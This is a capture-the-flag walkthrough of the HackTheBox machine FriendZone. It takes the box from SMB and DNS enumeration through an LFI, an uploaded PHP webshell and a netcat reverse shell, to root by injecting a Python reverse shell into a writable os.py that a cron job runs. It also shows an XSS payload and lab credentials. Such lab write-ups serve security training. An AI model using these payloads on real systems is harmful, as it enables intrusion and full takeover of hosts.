---
title: HTB: FriendZone
url: https://0xdf.gitlab.io/2019/07/13/htb-friendzone.html
date: 2019-07-13T13:45:00+00:00
difficulty: Easy [20]
os: Linux
tags: htb-friendzone, ctf, hackthebox, nmap, smbmap, smbclient, gobuster, zone-transfer, dns, dig, lfi, php, wfuzz, credentials, ssh, pspy, python-library-hijack, oscp-like-v2, oscp-like-v1
---

![FriendZone-cover](https://0xdfimages.gitlab.io/img/friendzone-cover.png)

FriendZone was a relatively easy box, but as far as easy boxes go, it had a lot of enumeration and garbage trolls to sort through. In all the enumeration, I’ll find a php page with an LFI, and use SMB to read page source and upload a webshell. I’ll uprivesc to the next user with creds from a database conf file, and then to root using a writable python module to exploit a root cron job calling a python script.

## Box Info

| Name | [FriendZone](https://hackthebox.com/machines/friendzone)  [FriendZone](https://hackthebox.com/machines/friendzone) [Play on HackTheBox](https://hackthebox.com/machines/friendzone) |
| --- | --- |
| Release Date | [09 Feb 2019](https://twitter.com/hackthebox_eu/status/1093438619312898048) |
| Retire Date | 13 Jul 2019 |
| OS | Linux Linux |
| Base Points | Easy [20] |
| Rated Difficulty | Rated difficulty for FriendZone |
| Radar Graph | Radar chart for FriendZone |
| First Blood User | 00:48:46[Adamm Adamm](https://app.hackthebox.com/users/2571) |
| First Blood Root | 01:04:31[no0ne no0ne](https://app.hackthebox.com/users/21927) |
| Creator | [askar askar](https://app.hackthebox.com/users/17292) |

## Recon

### nmap

Lots of ports open, including FTP (21), SSH (22), DNS (53), HTTP (80), HTTPS (443), and SMB (139/445):

```

root@kali# nmap -sT -p- --min-rate 10000 -oA nmap/alltcp 10.10.10.123
Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-11 16:52 EST
Nmap scan report for 10.10.10.123
Host is up (0.018s latency).
Not shown: 65528 closed ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
53/tcp  open  domain
80/tcp  open  http
139/tcp open  netbios-ssn
443/tcp open  https
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 7.04 seconds

root@kali# nmap -sU -p- --min-rate 10000 -oA nmap/alludp 10.10.10.123
Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-11 16:53 EST
Warning: 10.10.10.123 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.123
Host is up (0.020s latency).
Not shown: 65455 open|filtered ports, 78 closed ports
PORT    STATE SERVICE
53/udp  open  domain
137/udp open  netbios-ns

Nmap done: 1 IP address (1 host up) scanned in 72.92 seconds

root@kali# nmap -sC -sV -p 21,22,53,80,137,139,443,445 -oA nmap/scripts 10.10.10.123
Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-11 16:55 EST
Nmap scan report for 10.10.10.123
Host is up (0.017s latency).

PORT    STATE  SERVICE     VERSION
21/tcp  open   ftp         vsftpd 3.0.3
22/tcp  open   ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA)
|   256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA)
|_  256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519)
53/tcp  open   domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu
80/tcp  open   http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Friend Zone Escape software
137/tcp closed netbios-ns
139/tcp open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
443/tcp open   ssl/http    Apache httpd 2.4.29
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 404 Not Found
| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO
| Not valid before: 2018-10-05T21:02:30
|_Not valid after:  2018-11-04T21:02:30
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
445/tcp open   netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Hosts: FRIENDZONE, 127.0.0.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -48m13s, deviation: 1h09m16s, median: -8m14s
|_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: friendzone
|   NetBIOS computer name: FRIENDZONE\x00
|   Domain name: \x00
|   FQDN: friendzone
|_  System time: 2019-02-11T23:47:26+02:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2019-02-11 16:47:26
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.81 seconds

```

Based on the OpenSSH and Apache versions, this seems likely to be Ubuntu 18.04.

I’ll take careful notice of the domain in the TLS certificate, `commonName=friendzone.red`.

### SMB - TCP 445 / 139

#### Enumerate Shares

I’ll go to `smbmap` for a quick look at the shares and my permissions:

```

root@kali# smbmap -H 10.10.10.123                                                                                                                                             [100/100]
[+] Finding open SMB ports....                                       
[+] Guest SMB session established on 10.10.10.123...              
[+] IP: 10.10.10.123:445        Name: friendzone.red                                           
        Disk                                                    Permissions
        ----                                                    -----------
        print$                                                  NO ACCESS
        Files                                                   NO ACCESS
        general                                                 READ ONLY
        Development                                             READ, WRITE
        IPC$                                                    NO ACCESS

```

I can get a similar list (without Permissions) from `smbclient` using `-N` for null session (or no auth) and `-L` to list:

```

root@kali# smbclient -N -L //10.10.10.123

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        Files           Disk      FriendZone Samba Server Files /etc/Files
        general         Disk      FriendZone Samba Server Files
        Development     Disk      FriendZone Samba Server Files
        IPC$            IPC       IPC Service (FriendZone server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            FROLIC

```

It’s interesting to see the comment on `Files` as `/etc/Files`. I can guess that perhaps `general` and `Development` follow the same pattern. But I don’t have to guess, as there’s one more thing that’s particularly useful here - the `nmap` script, `smb-enum-shares.nse`.

```

root@kali# nmap --script smb-enum-shares.nse -p445 10.10.10.123
Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-12 10:22 EST
Nmap scan report for friendzone.red (10.10.10.123)
Host is up (0.017s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares:
|   account_used: guest
|   \\10.10.10.123\Development:
|     Type: STYPE_DISKTREE
|     Comment: FriendZone Samba Server Files
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\etc\Development
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.10.123\Files:
|     Type: STYPE_DISKTREE
|     Comment: FriendZone Samba Server Files /etc/Files
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\etc\hole
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.10.123\IPC$:
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (FriendZone server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.10.123\general:
|     Type: STYPE_DISKTREE
|     Comment: FriendZone Samba Server Files
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\etc\general
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.10.123\print$:
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>

Nmap done: 1 IP address (1 host up) scanned in 5.62 seconds

```

What’s particularly neat about the `nmap` script output is that it tells me the path on target to the share (even if it’s a bit messed up and applies a `C:` to the start of each string). That’ll come in handy later.

#### Development

The Development share is empty:

```

root@kali# smbclient -N //10.10.10.123/Development                                                            
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Feb 12 10:17:41 2019
  ..                                  D        0  Sun Feb 10 20:46:10 2019

                9221460 blocks of size 1024. 5795128 blocks available

```

#### general

The general share has a single file, but it looks like it’ll be useful:

```

root@kali# smbclient -N //10.10.10.123/general
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jan 16 15:10:51 2019
  ..                                  D        0  Sun Feb 10 20:46:10 2019
  creds.txt                           N       57  Tue Oct  9 19:52:42 2018

                9221460 blocks of size 1024. 5795120 blocks available
smb: \> get creds.txt
getting file \creds.txt of size 57 as creds.txt (0.7 KiloBytes/sec) (average 0.7 KiloBytes/sec)

```

```

root@kali# cat creds.txt 
creds for the admin THING:

admin:WORKWORKHhallelujah@#

```

### http - friendzone.red - TCP 80

#### Site

The site doesn’t have much going on, other than to offer another the domain, “friendzoneportal.red”:

![1549924241766](https://0xdfimages.gitlab.io/img/1549924241766.png)

#### gobuster

Running `gobuster` gives two more paths, but both are trolls:

```

root@kali# gobuster -u http://friendzone.red/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x txt,php -t 20

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://friendzone.red/
[+] Threads      : 20
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : txt,php
[+] Timeout      : 10s
=====================================================
2019/02/11 17:11:05 Starting gobuster
=====================================================
/wordpress (Status: 301)
/robots.txt (Status: 200)
=====================================================
2019/02/11 17:15:59 Finished
=====================================================

```

`robots.txt` is just a troll:

```

root@kali# curl http://friendzone.red/robots.txt
seriously ?!

```

`/wordpress` is an empty dir:

![1549924532144](https://0xdfimages.gitlab.io/img/1549924532144.png)

### https - friendzone.red - TCP 443

#### Site

The HTTPS site is different from the HTTP site. The main site is just a meme with an animated gif:

![1549924607060](https://0xdfimages.gitlab.io/img/1549924607060.png)

#### gobuster

`gobuster` shows a couple more paths:

```

root@kali# gobuster -k -u https://friendzone.red/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 20 -x txt,php

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : https://friendzone.red/
[+] Threads      : 20
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : txt,php
[+] Timeout      : 10s
=====================================================
2019/02/11 17:16:04 Starting gobuster
=====================================================
/admin (Status: 301)
/js (Status: 301)
=====================================================
2019/02/11 17:24:51 Finished
=====================================================

```

`/admin` is an empty dir just like `/wordpress` was on http:

![1549924674427](https://0xdfimages.gitlab.io/img/1549924674427.png)

`/js` has something in it:

![1549924699366](https://0xdfimages.gitlab.io/img/1549924699366.png)

Going to `https://friendzone.red/js/js/` gives a page:

![1549924725149](https://0xdfimages.gitlab.io/img/1549924725149.png)

The source reveals it also has some comments:

```

<p>Testing some functions !</p><p>I'am trying not to break things !</p>S0s4ZGFJdjFibDE1NDk5MjIwMDJIbWt2TmtKZThr<!-- dont stare too much , you will be smashed ! , it's all about times and zones ! -->

```

This doesn’t have much meaning to me yet. Might be an allusion to DNS zones. Or it might just be a troll.

### DNS - TCP/UDP 53

TCP is only used in DNS when the response size is greater than 512 bytes. Typically this is associated with Zone Transfers, where the server give all the information it has for a domain. There’s a few things I could try to enumerate DNS, but the fact that the host is listening on TCP 53 suggests the first thing I should try is a Zone Transfer.

I’ll do that with `dig`. I’ll start with `friendzone.htb`, and get nothing:

```

root@kali# dig axfr friendzone.htb @10.10.10.123

; <<>> DiG 9.11.5-P1-1-Debian <<>> axfr friendzone.htb @10.10.10.123
;; global options: +cmd
; Transfer failed.

```

Since I have a domain name in the TLS certificate, I’ll try that:

```

root@kali# dig axfr friendzone.red @10.10.10.123

; <<>> DiG 9.11.5-P1-1-Debian <<>> axfr friendzone.red @10.10.10.123
;; global options: +cmd
friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
friendzone.red.         604800  IN      AAAA    ::1
friendzone.red.         604800  IN      NS      localhost.
friendzone.red.         604800  IN      A       127.0.0.1
administrator1.friendzone.red. 604800 IN A      127.0.0.1
hr.friendzone.red.      604800  IN      A       127.0.0.1
uploads.friendzone.red. 604800  IN      A       127.0.0.1
friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
;; Query time: 28 msec
;; SERVER: 10.10.10.123#53(10.10.10.123)
;; WHEN: Mon Feb 11 17:20:13 EST 2019
;; XFR size: 8 records (messages 1, bytes 289)

```

I can also try the domain I got on the first webpage, “friendzoneportal.red”:

```

root@kali# dig axfr friendzoneportal.red @10.10.10.123

; <<>> DiG 9.11.5-P1-1-Debian <<>> axfr friendzoneportal.red @10.10.10.123
;; global options: +cmd
friendzoneportal.red.   604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
friendzoneportal.red.   604800  IN      AAAA    ::1
friendzoneportal.red.   604800  IN      NS      localhost.
friendzoneportal.red.   604800  IN      A       127.0.0.1
admin.friendzoneportal.red. 604800 IN   A       127.0.0.1
files.friendzoneportal.red. 604800 IN   A       127.0.0.1
imports.friendzoneportal.red. 604800 IN A       127.0.0.1
vpn.friendzoneportal.red. 604800 IN     A       127.0.0.1
friendzoneportal.red.   604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
;; Query time: 20 msec
;; SERVER: 10.10.10.123#53(10.10.10.123)
;; WHEN: Mon Feb 11 17:29:20 EST 2019
;; XFR size: 9 records (messages 1, bytes 309)

```

I’ll update my hosts file for each of these:

```

root@kali# grep friendzone /etc/hosts
10.10.10.123 friendzone.red administrator1.friendzone.red hr.friendzone.red uploads.friendzone.red friendzoneportal.red admin.friendzoneportal.red files.friendzoneportal.red imports.friendzoneportal.red vpn.friendzoneportal.red

```

### SubDomains on http / TCP 80

All the subdomains on http seem to go back to the same site. I’ll leave them for now.

### SubDomains on https / TCP 443

I’ve got 8 more domains to check out now. Most aren’t very interesting, so I’ll summarize them here:

| Domain | Comments |
| --- | --- |
| administrator1.friendzone.red | See section below |
| hr.friendzone.red | 404 Not found |
| uploads.friendzone.red | Fake Uploads Site |
| friendzoneportal.red | Text and gif of Michael Jackson eating popcorn |
| admin.friendzoneportal.red | Has login form. Creds from SMB work, but on login, message says “Admin page is not developed yet !!! check for another one” |
| files.friendzoneportal.red | 404 Not found |
| imports.friendzoneportal.red | 404 Not found |
| vpn.friendzoneportal.red | 404 Not found |

### administrator1.friendzone.red

#### Site

The page presents a login form:

![1549988963862](https://0xdfimages.gitlab.io/img/1549988963862.png)

This is where the creds from SMB will be useful. On logging in, it returns a message:

![1549989022192](https://0xdfimages.gitlab.io/img/1549989022192.png)

#### dashboard.php

This site is “untested application” with some sloppy text including an error message:

![1549989060984](https://0xdfimages.gitlab.io/img/1549989060984.png)

If I add the suggested parameters to the url and visit `https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=timestamp`:

![1549989147745](https://0xdfimages.gitlab.io/img/1549989147745.png)

#### gobuster

At this point, it would be useful to have a `gobuster` run of the directory. I’ll run `gobuster` with php extension because this is a php site:

```

root@kali# gobuster -k -u https://administrator1.friendzone.red -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : https://administrator1.friendzone.red/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : php
[+] Timeout      : 10s
=====================================================
2019/02/12 06:59:54 Starting gobuster
=====================================================
/images (Status: 301)
/login.php (Status: 200)
/dashboard.php (Status: 200)
/timestamp.php (Status: 200)
=====================================================
2019/02/12 07:08:54 Finished
=====================================================

```

So timestamp.php is another page. I can check it out by visiting it:

```

root@kali# curl -k https://administrator1.friendzone.red/timestamp.php
Final Access timestamp is 1549992438

```

## Shell As www-data

### Find LFI

Based on the recon above, there’s a likely local file include (LFI) in this page. Both parameters have potential.

#### image\_id

The image id, such as `a.jpg` is a full file name. I’ll try giving it a php page, which it would load if that file is being shown using `include` in php. Unfortunately, it just shows a broken image:

![1549990054660](https://0xdfimages.gitlab.io/img/1549990054660.png)

Looking at the source, I see `<img src='images/timestamp.php'>`. I could play with XSS here, and see if I can get it to load a script. For example, if I set `image_id=' onerror='javascript: alert("XXS HERE");`, I get a pop-up:

![1549990474028](https://0xdfimages.gitlab.io/img/1549990474028.png)

The source explains it: `<img src='images/' onerror='javascript: alert("XXS HERE");'>`

If this were a public site, I could close off the image tag and add an iframe with a malicious site (say, a login dialog), and then phish with the url coming from a trusted site. But for now, I’ll turn to the second parameter.

#### pagename

Since the given example case is `timestamp`, and there’s a `timestamp.php` in the same directory, I can assume that this is likely doing a `include($_GET["pagename"] . ".php")`. I can test this by having it point to other php pages.

Visiting `https://administrator1.friendzone.red/login.php` returns:

![1549991359728](https://0xdfimages.gitlab.io/img/1549991359728.png)

If I change `pagename` to login, I see `login.php` in the bottom corner:

![1549991378014](https://0xdfimages.gitlab.io/img/1549991378014.png)

I can also try to reference pages outside this directory. On the uploads subdomain, there’s an `upload.php`:

```

root@kali# curl -k https://uploads.friendzone.red/upload.php
WHAT ARE YOU TRYING TO DO HOOOOOOMAN !

```

If I guess that the uploads site is in a folder called uploads, I can get it with `pagename=../uploads/upload.php`:

![1549992211060](https://0xdfimages.gitlab.io/img/1549992211060.png)

### Read PHP Source

I can use this LFI to read source code for these pages using php filters. If I visit `pagename=php://filter/convert.base64-encode/resource=dashboard`, I can see a long base64 string on the page:

![1549992353577](https://0xdfimages.gitlab.io/img/1549992353577.png)

Decoding that gives me the source for the page:

```

<?php

//echo "<center><h2>Smart photo script for friendzone corp !</h2></center>";
//echo "<center><h3>* Note : we are dealing with a beginner php developer and the application is not tested yet !</h3></center>";
echo "<title>FriendZone Admin !</title>";
$auth = $_COOKIE["FriendZoneAuth"];

if ($auth === "e7749d0f4b4da5d03e6e9196fd1d18f1"){
 echo "<br><br><br>";

echo "<center><h2>Smart photo script for friendzone corp !</h2></center>";
echo "<center><h3>* Note : we are dealing with a beginner php developer and the application is not tested yet !</h3></center>";

if(!isset($_GET["image_id"])){
  echo "<br><br>";
  echo "<center><p>image_name param is missed !</p></center>";
  echo "<center><p>please enter it to show the image</p></center>";
  echo "<center><p>default is image_id=a.jpg&pagename=timestamp</p></center>";
 }else{
 $image = $_GET["image_id"];
 echo "<center><img src='images/$image'></center>";

 echo "<center><h1>Something went worng ! , the script include wrong param !</h1></center>";
 include($_GET["pagename"].".php");
 //echo $_GET["pagename"];
 }
}else{
echo "<center><p>You can't see the content ! , please login !</center></p>";
}
?>

```

I can get other pages as well. For example, if I get `upload.php`, I can see it is in fact a fake uploads page:

```

<?php

// not finished yet -- friendzone admin !

if(isset($_POST["image"])){

echo "Uploaded successfully !<br>";
echo time()+3600;
}else{

echo "WHAT ARE YOU TRYING TO DO HOOOOOOMAN !";

}

?>

```

### Webshell

I want to use this LFI to include a webshell so I can run commands. I’ll use my smb access to drop a simple php command shell into the Development share, which `nmap` told me was `/etc/Development`.

```

root@kali# cat cmd.php 
<?php system($_REQUEST['cmd']); ?>

root@kali# smbclient -N //10.10.10.123/Development -c 'put cmd.php 0xdf.php'
putting file cmd.php as \0xdf.php (0.6 kb/s) (average 0.6 kb/s)

```

Now, on visiting `https://administrator1.friendzone.red/dashboard.php?image_id=&pagename=../../../etc/Development/0xdf&cmd=id`, I get output:

![1549992654973](https://0xdfimages.gitlab.io/img/1549992654973.png)

Even if I had not known where the directory was on disk, I could have made some guesses and got it with fuzzing. For example, I’ll assuming the share is a folder named `Development`. I’ll start that it’s likely in the root or one level up. So I’ll make a word list from my box:

```

root@kali# ls -d /* > root_dirs 
root@kali# echo "/" >> root_dirs

```

Then I can `wfuzz` with the following url: `https://administrator1.friendzone.red/dashboard.php?image_id=&pagename=../../..FUZZ/Development/0xdf&cmd=id`. I’ll use `../` to move up three levels presumably to the system root, and then `FUZZ` to try each directory (including `/`), and then `Development/0xdf`. I’ll add the `cmd=id` parameter to give some output to look for. With no output, `wfuzz` reports 0 lines. I’ll hide that with `--hl 0`. It finds the directory in `/etc`:

```

root@kali# wfuzz --hl 0 -c -w ./root_dirs -H 'Cookie: FriendZoneAuth=e7749d0f4b4da5d03e6e9196fd1d18f1' 'https://administrator1.friendzone.red/dashboard.php?image_id=&pagename=../../..FUZZ/Development/0xdf&cmd=id'
********************************************************
* Wfuzz 2.3.4 - The Web Fuzzer                         *
********************************************************

Target: https://administrator1.friendzone.red/dashboard.php?image_id=&pagename=../../..FUZZ/Development/0xdf&cmd=id
Total requests: 27

==================================================================
ID   Response   Lines      Word         Chars          Payload    
==================================================================

000004:  C=200      1 L       40 W          403 Ch        "/etc"

Total time: 0.315563
Processed Requests: 27
Filtered Requests: 26
Requests/sec.: 85.56111

```

### Shell

Of course I want a real shell. I’ll use my go to from the [Reverse Shell Cheat Sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet), and visit: `https://administrator1.friendzone.red/dashboard.php?image_id=&pagename=../../../etc/Development/0xdf&cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>%261|nc 10.10.14.7 443 >/tmp/f` (remembering to encode the `&` as `%26`):

```

root@kali# nc -lnvp 443
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.123.
Ncat: Connection from 10.10.10.123:45840.
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

After a shell upgrade (`python -c 'import pty;pty.spawn("bash")'`, `ctrl-z`, `stty raw -echo`, `fg`, `reset`, enter “screen” for terminal type if asked), I’ve got a full shell. And I can get user.txt:

```

www-data@FriendZone:/home/friend$ cat user.txt 
a9ed20ac...

```

## Priv: www-data to friend

In the `/var/www/` directory, there’s folders for all the different sites, as well as an sql conf file:

```

www-data@FriendZone:/var/www$ ls
admin       friendzoneportal       html             uploads
friendzone  friendzoneportaladmin  mysql_data.conf

www-data@FriendZone:/var/www$ cat mysql_data.conf 
for development process this is the mysql creds for user friend

db_user=friend
db_pass=Agpyu12!0.213$
db_name=FZ

```

Those creds happen to work for friend. I can either `su friend`:

```

www-data@FriendZone:/var/www$ su friend
Password: 
friend@FriendZone:/var/www$ 

```

or ssh in with them:

```

root@kali# ssh friend@10.10.10.123
friend@10.10.10.123's password:
Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-36-generic x86_64)
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch
You have mail.
Last login: Mon Feb 11 23:16:53 2019 from 10.10.14.18
friend@FriendZone:~$ 

```

## Priv: friend to root

### Enumeration

#### reporter.py

I was looking around the file system, and I noticed a script in `/opt/server_admin/`:

```

friend@FriendZone:/opt/server_admin$ ls
reporter.py

```

It says it’s incomplete, and doesn’t do much of anything:

```

#!/usr/bin/python

import os

to_address = "admin1@friendzone.com"
from_address = "admin2@friendzone.com"

print "[+] Trying to send email to %s"%to_address

#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass "PAPAP"'''

#os.system(command)

# I need to edit the script later
# Sam ~ python developer

```

#### Cron

I uploaded [pspy](https://github.com/DominicBreuker/pspy) to target, and noticed that root was running this script every two minutes:

```

2019/02/12 15:18:01 CMD: UID=0    PID=26106  | /usr/bin/python /opt/server_admin/reporter.py 
2019/02/12 15:18:01 CMD: UID=0    PID=26105  | /bin/sh -c /opt/server_admin/reporter.py 
2019/02/12 15:18:01 CMD: UID=0    PID=26104  | /usr/sbin/CRON -f 
2019/02/12 15:20:01 CMD: UID=0    PID=26109  | /usr/bin/python /opt/server_admin/reporter.py 
2019/02/12 15:20:01 CMD: UID=0    PID=26108  | /bin/sh -c /opt/server_admin/reporter.py 
2019/02/12 15:20:01 CMD: UID=0    PID=26107  | /usr/sbin/CRON -f 

```

#### os.py

Finally, I noticed that the python module, `os`, was writable:

```

friend@FriendZone:/usr/lib/python2.7$ find -type f -writable -ls
   262202     28 -rw-rw-r--   1 friend   friend      25583 Jan 15 22:19 ./os.pyc
   282643     28 -rwxrwxrwx   1 root     root        25910 Jan 15 22:19 ./os.py

```

### Python Library Hijack

Rastating has a good write-up on [Python Library Hijacking](https://rastating.github.io/privilege-escalation-via-python-library-hijacking/). I can use the following command to see the python path order:

```

friend@FriendZone:/dev/shm$ python -c 'import sys; print "\n".join(sys.path)'

/usr/lib/python2.7
/usr/lib/python2.7/plat-x86_64-linux-gnu
/usr/lib/python2.7/lib-tk
/usr/lib/python2.7/lib-old
/usr/lib/python2.7/lib-dynload
/usr/local/lib/python2.7/dist-packages
/usr/lib/python2.7/dist-packages

```

I *think* that blank line at the top indicates the current directory of the script.

The most common case for this kind of hijack is finding the directory containing the python script writable. In that case, I could drop an `os.py` in next to `reporter.py` and it would load there before checking `/usr/lib/python2.7/`. In this case, I actually can’t write to `/opt/server_admin/`. But I can write directly to the normal version of this module.

I’ll open the file in `vi`, and go to the bottom. There, I’ll add a shell to myself:

```

...[snip]...
def _pickle_statvfs_result(sr):
    (type, args) = sr.__reduce__()
    return (_make_statvfs_result, args)

try:
    _copy_reg.pickle(statvfs_result, _pickle_statvfs_result,
                     _make_statvfs_result)
except NameError: # statvfs_result may not exist
    pass

import pty
import socket

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.7",443))
dup2(s.fileno(),0)
dup2(s.fileno(),1)
dup2(s.fileno(),2)
pty.spawn("/bin/bash")
s.close()

```

It’s a standard python reverse shell, except that instead of `os.dup2()`, I just write `dup2()`. That’s because I’m in the os module right now. It actually should still work if you just `import os`, but I removed it as it’s not needed.

I’ll save that. Since waiting two minutes to fail is annoying, I’ll open python on my own and see if I get a shell back as friend. On just starting `python`, I get a callback, and have a shell. I’ll exit out and wait for the cron. Once the two minutes rolls, shell:

```

root@kali# nc -lnvp 443
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.123.
Ncat: Connection from 10.10.10.123:46118.
root@FriendZone:~# id
uid=0(root) gid=0(root) groups=0(root)

```

From there, grab `root.txt`:

```

root@FriendZone:~# cat root.txt 
b0e6c60b...

```